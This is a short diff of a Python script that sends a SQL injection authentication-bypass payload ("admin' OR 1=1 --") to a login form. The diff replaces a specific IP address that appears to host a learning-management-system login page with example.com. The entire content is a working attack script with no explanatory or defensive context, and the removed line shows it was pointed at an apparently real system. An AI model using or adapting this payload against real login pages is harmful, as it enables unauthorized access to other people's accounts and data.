@@ -1,6 +1,6 @@
 import requests
 
-url = "http://118.107.134.251/uobs-lms//login"  
+url = "http://example.com//login"  
 payload = {"username": "admin' OR 1=1 --", "password": "password"}
 response = requests.post(url, data=payload)
 
